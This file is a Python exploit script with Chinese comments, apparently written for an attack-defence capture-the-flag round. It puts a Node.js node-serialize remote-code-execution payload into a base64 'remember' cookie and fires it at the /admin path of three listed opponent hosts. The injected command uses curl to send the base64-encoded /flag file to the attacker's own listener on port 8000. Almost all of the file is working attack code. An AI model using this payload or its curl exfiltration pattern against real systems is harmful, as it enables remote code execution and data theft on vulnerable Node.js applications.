import requests
import base64

# ================= 配置区 =================
# 你刚才用 ipconfig 查到的 Windows 局域网真实 IP
MY_LISTENER_IP = "10.38.101.162"

# 截图中提供的对手靶机地址
TARGETS = [
    "pwqmtr134-1.awd112-1.ncc.nssctf.cn:81",
    "sfrana134-4.awd112-1.ncc.nssctf.cn:81",
    "tkedre134-3.awd112-1.ncc.nssctf.cn:81"
]
# ==========================================

# 构造 Node.js 反序列化 Payload
# 让靶机读取 /flag，base64编码后，通过 curl 发送给你主机的 8000 端口
cmd = f"curl http://{MY_LISTENER_IP}:8000/?f=$(cat /flag | base64 -w 0)"

# 拼接并编码反序列化执行函数 (注意这里的括号已经修复，先拼接再 encode)
nodejs_payload = ('{"rce":"_$$ND_FUNC$$_function(){ require(\'child_process\').exec(\'' + cmd + '\'); }()"}').encode(
    'utf-8')

# 将整个 Payload 进行 Base64 编码，符合代码里 new Buffer(..., 'base64') 的要求
encoded_payload = base64.b64encode(nodejs_payload).decode('utf-8')

cookies = {
    "remember": encoded_payload
}

print("[*] 核弹已装填，开始全频段发射...")

for target in TARGETS:
    target_url = f"http://{target}/admin"
    print(f"[*] 正在轰炸: {target_url}")

    try:
        # 发送带有恶意 Cookie 的请求触发反序列化漏洞
        requests.get(target_url, cookies=cookies, timeout=5)
        print(f"[+] 对 {target} 发射完毕！")
    except Exception as e:
        print(f"[-] 目标 {target} 连接异常，可能已宕机。")

print("\n[+] 轰炸指令执行结束！")
print("[!] 请立刻切回你运行 `python -m http.server 8000` 的那个 CMD 黑框框盯紧日志！")